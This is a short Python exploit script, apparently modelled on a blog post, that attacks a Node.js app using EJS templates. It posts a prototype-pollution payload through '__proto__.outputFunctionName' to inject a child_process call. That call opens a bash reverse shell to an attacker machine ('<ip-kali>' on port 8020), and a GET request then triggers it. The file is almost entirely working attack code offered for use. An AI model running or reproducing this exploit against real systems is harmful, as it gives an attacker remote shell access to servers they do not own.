##############################################################
# Run this .py to perform EJS-RCE attack
# referenced from
# https://blog.p6.is/Real-World-JS-1/
# 
# Timothy, 10 November 2020
##############################################################

### imports
import requests

### commands to run on victim machine
cmd = 'bash -c "bash -i &> /dev/tcp/<ip-kali>/8020 0>&1"'

print("Starting Attack...")
### pollute
requests.post('http://localhost:8080', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

### execute command
requests.get('http://localhost:8080')
print("Finished!")
